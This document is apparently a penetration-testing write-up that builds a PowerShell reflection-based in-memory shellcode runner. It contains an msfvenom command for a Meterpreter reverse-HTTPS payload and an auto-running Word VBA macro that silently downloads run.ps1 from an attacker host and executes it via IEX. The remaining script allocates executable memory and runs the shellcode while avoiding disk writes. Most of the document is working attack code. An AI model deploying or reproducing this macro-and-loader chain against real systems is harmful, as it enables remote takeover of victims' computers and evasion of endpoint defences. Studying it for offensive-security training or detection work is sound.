# PowerShell-Reflection-Shellcode-Runner

Payload generation

  	msfvenom -p windows/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f ps1
  
 our Microsoft Office 2016 version of Word is a 32-bit process, which means that PowerShell will also launch as a 32-bit process.

VBA code calling the PowerShell cradle that executes the shellcode runner

                    Sub MyMacro()
                      Dim str As String
                      str = "powershell (New-Object System.Net.WebClient).DownloadString('http://<kali ip>/run.ps1') | IEX"
                      Shell str, vbHide
                    End Sub
                  
                    Sub Document_Open()
                      MyMacro
                    End Sub
                  
                    Sub AutoOpen()
                      MyMacro
                    End Sub

we can also try and use .txt extension 

Complete PowerShell script for in-memory shellcode runner

		***<comment>Method wrapper to create a delegate type: accepts two arguments: the function arguments of the Win32 API given as an array and its return type. The first block creates the custom assembly and defines the module and type 
  			inside of it. The second block of code sets up the constructor, and the third sets up the invoke method. Finally, the constructor is invoked and the delegate type is returned to the caller.<comment>***

		function LookupFunc {
		
			Param ($moduleName, $functionName)
		
			$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
		    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
		      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
		    $tmp=@()
		    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
			return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
		}
		
		function getDelegateType {
		
			Param (
				[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
				[Parameter(Position = 1)] [Type] $delType = [Void]
			)
		***<comment>Creating a custom assembly object in memory and Setting the access mode of the assembly to Run; Creating a custom module inside the assembly<comment>***
			$type = [AppDomain]::CurrentDomain.
		    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
		    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
		      DefineDynamicModule('InMemoryModule', $false).
		      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
		      [System.MulticastDelegate])
		
		  $type.
		    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
		      SetImplementationFlags('Runtime, Managed')
		
		  $type.
		    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
		      SetImplementationFlags('Runtime, Managed')
		
			return $type.CreateType()
		}

		***<comment>Resolving and calling VirtualAlloc through reflection<comment>***
    
		$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 
  				0x40)
		
		[Byte[]] $buf = generated shell code
		
		[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

  		***<comment>Resolving and calling CreateThread through reflection<comment>***
    
		$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) 	
  			([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

  		***<comment>Resolving and calling WaitForSingleObject through reflection<comment>***
    
		[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
  

  It executed three primary steps related to the Win32 APIs. It located the function, specified argument data types, and invoked the function.
  There are two primary ways to locate functions in unmanaged dynamic link libraries. Our original technique relied on the Add-Type and DllImport keywords (or the Declare keyword in VBA). However, Add-Type calls the csc compiler, which writes to disk. 
  We must avoid this if we want to operate completely in-memory.

  Alternatively, Here we used a technique known as dynamic lookup, which is commonly used by low-level languages like C. By taking this path, we hope to create the .NET assembly in memory instead of writing code and compiling it.

  To perform a dynamic lookup of function addresses, the operating system provides two special Win32 APIs called GetModuleHandle and GetProcAddress
  GetModuleHandle obtains a handle to the specified DLL, which is actually the memory address of the DLL. To find the address of a specific function, we'll pass the DLL handle and the function name to GetProcAddress, which will return the function 
  address. We can use these functions to locate any API, but we must invoke them without using Add-Type.

  Since we cannot create any new assemblies, we'll try to locate existing assemblies that we can reuse. It stands to reason that we could search the preloaded assemblies for the presence of GetModuleHandle and GetProcAddress.
  However, there is an issue that these methods are only meant to be used internally by the .NET code. This blocks us from calling them directly from PowerShell or C#.
  To solve this issue, we have to develop a way that allows us to call it indirectly.

  The first step is to obtain a reference to these functions. To do that, we must first obtain a reference to the System.dll assembly using the GetType method.This reference to the System.dll assembly will allow us to subsequently locate the 
  GetModuleHandle and GetProcAddress methods inside it.

  Using GetType to obtain a reference to the System.dll assembly at runtime is an example of the Reflection technique. This is a very powerful feature that allows us to dynamically obtain references to objects that are otherwise private or internal.

  
  
		
		  
